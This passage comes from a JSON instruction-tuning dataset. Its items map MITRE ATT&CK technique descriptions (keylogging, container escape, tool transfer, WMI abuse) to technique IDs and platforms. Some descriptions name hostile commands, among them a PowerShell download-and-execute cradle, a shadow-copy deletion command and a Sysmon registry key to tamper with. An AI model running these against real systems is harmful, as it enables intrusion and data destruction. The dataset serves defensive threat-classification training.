      "question": "What are the platforms that are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "answer": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
    "context": "",
    "output": "The provided description is related to MITRE technique Input Capture: Keylogging (T1056.001);\nTechnique Input Capture: Keylogging (T1056.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
      "answer": "The provided description is related to MITRE technique Input Capture: Keylogging (T1056.001);\nTechnique Input Capture: Keylogging (T1056.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a Container Administration Command. Adversaries may also escape via Exploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers running on the host, or setting up a command and control channel on the host.",
    "context": "",
    "output": "The provided description is related to MITRE technique Escape to Host (T1611);\nTechnique Escape to Host (T1611) is applicable to platforms: Linux,  Windows, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a Container Administration Command. Adversaries may also escape via Exploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers running on the host, or setting up a command and control channel on the host.",
      "answer": "The provided description is related to MITRE technique Escape to Host (T1611);\nTechnique Escape to Host (T1611) is applicable to platforms: Linux,  Windows, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.",
    "context": "",
    "output": "The provided description is related to MITRE technique Screen Capture (T1113);\nTechnique Screen Capture (T1113) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.",
      "answer": "The provided description is related to MITRE technique Screen Capture (T1113);\nTechnique Screen Capture (T1113) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Impair Defenses: Disable or Modify Tools (T1562.001);\nTechnique Impair Defenses: Disable or Modify Tools (T1562.001) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
      "answer": "The provided description is related to MITRE technique Impair Defenses: Disable or Modify Tools (T1562.001);\nTechnique Impair Defenses: Disable or Modify Tools (T1562.001) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: PowerShell (T1059.001);\nTechnique Command and Scripting Interpreter: PowerShell (T1059.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: PowerShell (T1059.001);\nTechnique Command and Scripting Interpreter: PowerShell (T1059.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
    "context": "",
    "output": "The provided description is related to MITRE technique Hijack Execution Flow: DLL Side-Loading (T1574.002);\nTechnique Hijack Execution Flow: DLL Side-Loading (T1574.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
      "answer": "The provided description is related to MITRE technique Hijack Execution Flow: DLL Side-Loading (T1574.002);\nTechnique Hijack Execution Flow: DLL Side-Loading (T1574.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
    "context": "",
    "output": "The provided description is related to MITRE technique User Execution: Malicious Link (T1204.001);\nTechnique User Execution: Malicious Link (T1204.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
      "answer": "The provided description is related to MITRE technique User Execution: Malicious Link (T1204.001);\nTechnique User Execution: Malicious Link (T1204.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in Malicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in Spearphishing Link) or a phish to gain initial access to a system (as in Spearphishing Link), an adversary must set up the resources for a link target for the spearphishing link. \n\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as JavaScript to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during Spearphishing Link. Adversaries may also Upload Malware and have the link target point to malware for download/execution by the user.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Malicious Link.\n\nLinks can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.\n\nAdversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages. In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links). Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Stage Capabilities: Link Target (T1608.005);\nTechnique Stage Capabilities: Link Target (T1608.005) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in Malicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in Spearphishing Link) or a phish to gain initial access to a system (as in Spearphishing Link), an adversary must set up the resources for a link target for the spearphishing link. \n\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as JavaScript to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during Spearphishing Link. Adversaries may also Upload Malware and have the link target point to malware for download/execution by the user.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Malicious Link.\n\nLinks can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.\n\nAdversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages. In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links). Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.",
      "answer": "The provided description is related to MITRE technique Stage Capabilities: Link Target (T1608.005);\nTechnique Stage Capabilities: Link Target (T1608.005) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Windows Management Instrumentation (T1047);\nTechnique Windows Management Instrumentation (T1047) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.",
      "answer": "The provided description is related to MITRE technique Windows Management Instrumentation (T1047);\nTechnique Windows Management Instrumentation (T1047) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
